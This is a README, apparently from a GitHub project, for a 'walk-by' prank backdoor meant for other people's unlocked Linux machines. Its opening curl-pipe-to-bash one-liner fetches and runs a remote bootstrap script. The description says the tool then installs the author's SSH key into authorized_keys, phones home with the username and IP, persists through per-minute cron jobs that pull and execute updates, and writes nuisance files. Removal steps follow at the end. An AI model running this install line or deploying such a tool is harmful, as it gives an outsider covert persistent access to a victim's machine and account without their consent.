# Walk-by install:

curl -s -L https://raw.githubusercontent.com/eadanila/not-trojan/master/bootstrap.sh | bash

---
# Description

A small collection of scripts I once used remind people to lock their PCs when they walk away. By example.

I'd call it a Trojan but it doesn't trick anyone into anything. It's like if the Greeks just walked
into Troy because the Trojans left the gate unlocked while they went to the kitchen for a coffee.

The walk-by install adds a user cron job to clone to full repo so that it can be installed in under 10
seconds of access to the machine reardless of repos size or network speed.

Once fully installed, it installs my SSH key into the machine's authorized keys file, phones home with
the username and IP address, and runs every minute via cron to do configured tasks. It does not attempt
to gain any higher priviliges than the user it runs as or to get the user's password.

Listening server was just a manually run `woof -U` instance. IP is hardcoded in `et-phone-home.sh`.

It carries out nuisance actions, like writing new files into random directories in `$HOME`. Written files
are tracked for easy removal. I'm not a monster. I just want to prove what can be done with very little
access to an unlocked Linux machine.

Remote control over SSH will only work on LAN unless the target has opened their firewall to SSH. Otherwise,
it should still work by pulling updates and executing via cron. 
# Removal

You can remove all traces of the install by:
1. Edit your crontab to remove all lines ending with `#lsconfig-*`
2. Remove all the files listed in `$HOME/.config/lsconfig/state/hello.log` 
    - `rm $(cat $HOME/.config/lsconfig/state/hello.log)`
    - It should be fine, but MAKE SURE THIS FILE DOESN'T HAVE ANY UNEXPECTED ENTRIES FIRST 
3. Remove `$HOME/.config/lsconfig`
4. Remove the key from `nobody@nowhere` in your authorized keys file.
4. Set things like your wallpaper back to normal
